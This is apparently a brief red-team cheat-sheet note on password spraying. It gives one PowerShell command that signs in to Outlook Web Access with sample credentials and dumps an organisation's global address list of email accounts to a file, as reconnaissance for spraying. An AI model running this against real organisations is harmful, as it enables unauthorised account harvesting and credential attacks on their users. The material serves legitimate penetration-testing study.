# Password Spraying
By connecting to Outlook Web Access Portal and utilizing the FindPeople method, it is able to gather the list of all email addresses:
```
Get-GlobalAddressList -ExchHostname outlook.office365.com -UserName thureinsoe@insomnia.com -Password 123456%*@aA -OutFile global-address-list.txt

```
